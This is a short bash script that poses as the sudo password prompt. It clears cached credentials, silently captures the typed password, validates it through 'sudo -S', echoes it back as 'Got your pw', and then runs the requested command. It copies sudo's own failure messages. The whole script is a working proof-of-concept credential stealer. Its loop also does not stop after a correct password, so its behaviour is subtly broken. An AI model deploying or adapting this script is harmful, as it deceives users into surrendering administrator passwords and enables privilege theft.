#!/bin/bash

sudo -k

for i in `seq 3`;
do
    read -s -p "[sudo] password for $USER: " rootpw
    echo ""

    echo $rootpw | sudo -S /bin/true 2> /dev/null
    sudores=$?

    if [ $sudores -eq 1 ];
    then
	    # failed pw
        echo "Sorry, try again.";
    elif [ $sudores -eq 0 ];
    then
        echo "Got your pw: $rootpw"
        echo "gonna run cmd '$@'"
        sudo $@
    fi

done

echo "sudo: 3 incorrect password attempts"
